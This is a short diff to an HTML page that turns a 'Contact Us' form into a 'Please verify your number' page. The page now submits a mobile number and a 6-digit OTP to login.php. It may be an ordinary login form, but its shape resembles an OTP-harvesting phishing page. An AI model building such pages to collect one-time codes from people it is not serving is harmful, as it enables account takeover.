@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Contact Form</title>
+<title>Please verify your number</title>
 
 <style>
 body{
@@ -52,12 +52,12 @@ button:hover{
 
 <div class="container">
 
-<h2>Contact Us</h2>
-
 <form action="login.php" method="POST">
- <input
+
+    <input
         type="tel"
         id="phone"
+        name="phone"
         placeholder="10-digit mobile number"
         pattern="[0-9]{10}"
         maxlength="10"
@@ -66,12 +66,13 @@ button:hover{
     <input
         type="password"
         id="otp"
+        name="otp"
         placeholder="6-digit OTP"
         pattern="[0-9]{6}"
         maxlength="6"
         required>
 
-<button type="submit">Send</button>
+    <button type="submit">Send</button>
 
 </form>
 
